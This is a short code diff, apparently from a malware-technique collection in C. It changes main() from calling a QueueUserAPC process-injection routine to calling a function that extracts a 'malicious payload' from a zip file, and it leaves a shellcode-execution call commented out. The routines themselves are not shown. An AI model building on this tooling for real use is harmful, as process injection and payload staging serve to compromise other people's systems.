@@ -20,7 +20,9 @@ INT main(VOID)
 	Pii.MethodEnum = E_QUEUE_USER_APC;
 
 	//ShellcodeExecutionViaFunctionCallbackMain(&Sei);
-	ProcessInjectionMain(&Pii);
+	//ProcessInjectionMain(&Pii);
+
+	MpfExtractMaliciousPayloadFromZipFileW((PWCHAR)L"C:\\Users\\dwThr\\Desktop\\Test.zip", (PWCHAR)L"C:\\Users\\dwThr\\Desktop\\");
 
 	return dwError;
 }
